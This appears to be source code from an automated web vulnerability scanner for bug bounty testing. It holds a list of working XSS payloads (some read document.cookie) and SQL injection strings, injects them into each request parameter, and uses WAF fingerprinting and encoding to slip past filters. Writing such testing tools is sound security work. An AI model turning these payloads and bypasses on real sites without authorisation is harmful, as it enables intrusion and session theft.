from typing import AsyncIterator, List, Optional
import copy
from .base import BaseSpecialist
from ..models import MutableRequest, MutationStrategy

class PayloadAgent(BaseSpecialist):
    """
    Specialist in injecting payloads into parameters and body.
    
    XSS STRATEGY (Bug Bounty Accepted):
    - alert(1) is often sandboxed and NOT accepted by bug bounty programs
    - We use payloads that inject VISIBLE text with document.domain/cookie
    - Unique BUGTRACE marker makes vision validation reliable
    """
    
    # Unique marker for vision validation (easily recognizable)
    XSS_MARKER = "BUGTRACE-XSS-CONFIRMED"
    
    # Professional XSS payloads that inject visible proof
    PAYLOADS = {
        "XSS": [
            # Level 1: Simple injection with visible marker (vision can read this)
            f'<div style="color:red;font-size:30px;position:fixed;top:0;left:0;z-index:9999;background:yellow;padding:20px">{XSS_MARKER}: <script>document.write(document.domain)</script></div>',
            
            # Level 2: Script-based with visible output
            f'"><script>document.body.innerHTML="<h1 style=color:red>{XSS_MARKER}</h1><h2>Domain: "+document.domain+"</h2>"</script>',
            
            # Level 3: IMG onerror with visible marker (bypasses some filters)
            f'"><img src=x onerror="document.body.innerHTML=\'<h1 style=background:yellow;color:red;font-size:40px>{XSS_MARKER}</h1><p>Domain: \'+document.domain">',
            
            # Level 4: SVG-based (often bypasses WAF)
            f'"><svg/onload="document.body.innerHTML=\'<div style=font-size:50px;color:red>{XSS_MARKER}</div>\'">',
            
            # Level 5: Details/ontoggle (modern bypass)
            f'<details open ontoggle="document.body.innerHTML=\'<h1>{XSS_MARKER}</h1><p>Cookie: \'+document.cookie">',
            
            # Level 6: Focus-based (user interaction not needed for auto-focus)
            f'"><input autofocus onfocus="document.body.innerHTML=\'<h1 style=color:red>{XSS_MARKER}</h1>\'">',
            
            # Level 7: Legacy alert for browser dialog detection (backup)
            '<script>alert(document.domain)</script>',
            '"><img src=x onerror=alert(document.domain)>',
        ],
        "SQLI": [
            "' OR 1=1 --",
            "\" OR 1=1 --",
            "admin' --",
            "1' AND SLEEP(5)--",
            "' OR '1'='1",
            "\" OR \"1\"=\"1"
        ]
    }

    async def analyze(self, request: MutableRequest) -> bool:
        # Relevant if there are parameters or body to inject
        return bool(request.params or request.data or request.json_payload)

    async def generate_mutations(self, request: MutableRequest, strategies: List[MutationStrategy]) -> AsyncIterator[MutableRequest]:
        if MutationStrategy.PAYLOAD_INJECTION not in strategies:
            return

        # Target parameters
        target_keys = list(request.params.keys())
        
        # very basic strategy: inject into each parameter
        for vuln_type, payloads in self.PAYLOADS.items():
            for payload in payloads:
                for param in target_keys:
                    mutation = copy.deepcopy(request)
                    # Inject in existing param
                    mutation.params[param] = payload
                    yield mutation
                    
                    # Also try appending
                    mutation_append = copy.deepcopy(request)
                    mutation_append.params[param] = mutation_append.params[param] + payload
                    yield mutation_append

from bugtrace.tools.waf import waf_fingerprinter, strategy_router, encoding_techniques

class EncodingAgent(BaseSpecialist):
    """
    Specialist in encoding payloads to bypass WAFs.

    UPDATED: Now uses intelligent WAF fingerprinting and strategy selection.
    """

    def __init__(self):
        self.detected_waf: str = "unknown"
        self.selected_strategies: List[str] = []

    async def analyze(self, request: MutableRequest) -> bool:
        """
        Analyze the target and detect WAF.
        """
        # Detect WAF for this target
        self.detected_waf, confidence = await waf_fingerprinter.detect(request.url)

        # Get best strategies for this WAF
        _, self.selected_strategies = await strategy_router.get_strategies_for_target(request.url)

        return True

    async def generate_mutations(
        self,
        request: MutableRequest,
        strategies: List[MutationStrategy]
    ) -> AsyncIterator[MutableRequest]:
        """
        Generate encoded mutations using intelligent strategy selection.
        """
        if MutationStrategy.BYPASS_WAF not in strategies:
            return

        # Ensure we have strategies
        if not self.selected_strategies:
            await self.analyze(request)

        # Generate encoded variants for each parameter value
        for k, v in request.params.items():
            async for mutation in self._generate_param_mutations(request, k, v):
                yield mutation

    async def _generate_param_mutations(
        self,
        request: MutableRequest,
        param_key: str,
        param_value: str
    ) -> AsyncIterator[MutableRequest]:
        """Generate mutations for a single parameter using selected strategies."""
        # Apply SPECIFIC strategies from router (not generic WAF-based)
        for strategy_name in self.selected_strategies:
            try:
                mutation = self._apply_encoding_strategy(request, param_key, param_value, strategy_name)
                if mutation:
                    yield mutation
            except Exception:
                # Log but continue
                pass

    def _apply_encoding_strategy(
        self,
        request: MutableRequest,
        param_key: str,
        param_value: str,
        strategy_name: str
    ) -> Optional[MutableRequest]:
        """Apply encoding strategy to parameter and return mutation if successful."""
        # Get the specific encoding technique
        technique = encoding_techniques.get_technique_by_name(strategy_name)
        if not technique:
            return None

        encoded_value = technique.encoder(str(param_value))
        if encoded_value == str(param_value):
            return None  # Only if encoding changed something

        mutation = copy.deepcopy(request)
        mutation.params[param_key] = encoded_value
        mutation._encoding_strategy = strategy_name
        return mutation

    def record_success(self, request: MutableRequest):
        """
        Call this when a mutation successfully bypassed the WAF.
        This feeds the learning system.
        """
        strategy = getattr(request, '_encoding_strategy', 'unknown')
        if strategy != 'unknown' and self.detected_waf != 'unknown':
            strategy_router.record_result(self.detected_waf, strategy, success=True)

    def record_failure(self, request: MutableRequest):
        """
        Call this when a mutation was blocked.
        This feeds the learning system.
        """
        strategy = getattr(request, '_encoding_strategy', 'unknown')
        if strategy != 'unknown' and self.detected_waf != 'unknown':
            strategy_router.record_result(self.detected_waf, strategy, success=False)
